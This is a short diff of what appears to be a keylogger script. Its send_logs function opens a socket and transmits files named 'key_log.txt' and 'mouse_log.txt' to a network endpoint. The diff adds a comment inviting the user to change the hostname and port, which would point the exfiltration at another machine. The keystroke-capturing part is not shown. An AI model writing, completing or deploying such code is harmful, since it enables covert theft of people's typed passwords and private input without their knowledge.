@@ -5,7 +5,7 @@ files = ['key_log.txt', 'mouse_log.txt']
 
 def send_logs():
     s = socket.socket()
-    s.connect(("localhost",9999))
+    s.connect(("localhost",9999))   # edit hostname and port here
 
     for filename in files:
         f = open (filename, "rb")
